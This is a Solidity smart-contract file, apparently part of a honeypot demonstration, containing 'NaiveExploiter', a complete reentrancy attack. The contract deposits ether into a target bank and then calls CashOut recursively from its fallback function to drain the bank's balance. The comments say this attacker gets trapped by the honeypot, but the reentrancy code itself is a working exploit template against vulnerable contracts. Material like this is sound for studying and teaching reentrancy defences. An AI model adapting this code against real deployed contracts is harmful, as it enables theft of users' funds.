pragma solidity ^0.4.19;

import "./Mortal.sol";

interface Private_Bank {
    function CashOut(uint _am) public;
    function Deposit() public payable;
}

/// @title Naive hacker code that wishes to exploit a honeypot contract.
/// @dev This code aims to take funds by exploiting reentrancy vulnerability,
/// but will have funds taken instead.
contract NaiveExploiter is Mortal 
{
    Private_Bank public target;

    /// @title Contract constructor
    /// @dev Requires 1 ether for contract functionality
    /// @param bankAddress The address of target bank to exploit
    constructor (address bankAddress) payable public{
        require(msg.value == 1 ether);
        owner = msg.sender;
        target = Private_Bank(bankAddress);
    }

    /// @notice The main function that tries to withdraw all funds from target contract.
    /// Unfortunately for the naive hacker - it will run successfully but have his money locked in the target.
    /// @dev an implementation of reentrancy vulnerability exploit, this is the first call to "target.CashOut"
    /// and the rest are in fallback function.
    function exploitReentrancy() public{
        // Send an ether so we have something to withdraw
        target.Deposit.value(1 ether)();
        
        // Attemp to Withdraw and exploit reentrancy vulnerability
        target.CashOut(1 ether);
    }

    /// @dev Fallback function that uses reentrancy vulnerability to withdraw all funds
    function() public payable{
        // Continue until bank contract is empty
        if (address(target).balance >= 1 ether) {
            target.CashOut(1 ether);
        }
    }

    function withdraw() public onlyOwner{
        msg.sender.transfer(address(this).balance);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}